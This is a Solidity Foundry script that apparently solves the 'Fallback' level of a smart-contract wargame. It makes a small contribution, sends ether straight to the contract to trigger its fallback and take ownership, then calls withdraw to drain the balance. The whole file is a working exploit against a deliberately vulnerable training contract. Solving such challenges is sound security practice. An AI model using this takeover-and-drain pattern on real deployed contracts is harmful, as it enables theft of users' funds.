// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {Fallback} from "../src/Level1.sol";

contract Level1Script is Script {
    Fallback public f;
    address addr = 0x8606fbF4416A0bfD11965FA8083a838e3c5EcACD;

    function setUp() public {
        f = Fallback(payable(addr));
    }

    function run() public {
        console.log(address(msg.sender).balance, "balance 1");

        console.log(f.owner(), "old owner");
        console.log(address(f), "contract addr");
        vm.startBroadcast();
        f.contribute{value: 0.0001 ether}();
        console.log(address(msg.sender).balance, "balance 2");

        (bool success,) = address(f).call{value: 0.0001 ether}("");
        console.log(address(msg.sender).balance, "balance 3");

        console.log(success, "is ok?");
        console.log(f.owner(), "new owner");
        f.withdraw();
        vm.stopBroadcast();
        console.log(address(f).balance);
    }
}
